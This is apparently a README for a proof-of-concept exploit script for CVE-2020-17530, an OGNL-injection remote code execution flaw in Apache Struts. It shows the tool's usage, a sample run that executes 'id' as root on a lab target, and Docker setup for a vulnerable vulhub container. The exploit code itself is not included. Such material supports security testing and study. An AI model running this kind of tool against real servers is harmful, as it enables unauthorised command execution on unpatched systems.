# CVE-2020-17530

Quick POC for [CVE-2020-17530](https://nvd.nist.gov/vuln/detail/CVE-2020-17530). In Apache Struts versions 2.0.0 - 2.5.25 a forced Object Graph Navigational Language (OGNL) evaluation on raw user input in tag attributes may lead to remote code execution (RCE).

```
$ python CVE-2020-17530.py --help
usage: CVE-2020-17530.py [-h] [-c COMMAND] [-n NAME] [-p PORT] [-t TARGET] [-u URI]

optional arguments:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        command
  -n NAME, --name NAME  form data name
  -p PORT, --port PORT  port
  -t TARGET, --target TARGET
                        target
  -u URI, --uri URI     uri

$ python CVE-2020-17530.py --target 10.10.30.62 --port 8080 --uri "/index.action" --command id
uid=0(root) gid=0(root) groups=0(root)
```

## Setup

```
$ docker pull vulhub/struts2:2.5.25
$ docker run -d -p 8080:8080 vulhub/struts2:2.5.25
```